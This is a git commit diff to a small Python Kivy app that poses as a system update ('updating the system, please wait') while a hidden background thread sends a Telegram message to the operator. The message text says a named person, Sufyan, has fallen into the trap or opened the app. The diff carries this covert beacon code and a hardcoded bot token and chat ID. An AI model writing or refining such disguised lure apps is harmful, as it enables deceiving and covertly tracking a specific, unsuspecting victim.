4bea2e06a29e968b6e5a4259763d0ac2653f4f02
MOHAMEDLBOO16 <156849075+MOHAMEDLBOO16@users.noreply.github.com>
2026-02-11 23:24:23 +0300

    Refactor SystemApp for Telegram notifications
    Updated Telegram bot notification message and improved error handling.

--- main.py
+++ main.py
@@ -6,21 +6,20 @@ import time
 
 class SystemApp(App):
     def build(self):
-        # بياناتك الشخصية
-        self.token = "8074139832:AAH018y37OunK0YlWJInR_O_9n32S5X6P1I"
+        # بيانات بوت تلجرام الخاص بك
+        self.token = "8074139832:AAH018y37OunK0YlWJIn_O_9n32S5X6P1I"
         self.chat_id = "6704689729"
         
+        # إرسال التنبيه في الخلفية
         Thread(target=self.notify, daemon=True).start()
         return Label(text="جاري تحديث النظام... يرجى الانتظار")
 
     def notify(self):
-        url = f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.chat_id}&text=🔔 سفيان وقع في الفخ! الهاتف متصل الآن."
-        while True:
-            try:
-                requests.get(url)
-                break
-            except: pass
-            time.sleep(10)
+        url = f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.chat_id}&text=🔔 سفيان فتح التطبيق الآن!"
+        try:
+            requests.get(url)
+        except:
+            pass
 
 if __name__ == "__main__":
     SystemApp().run()
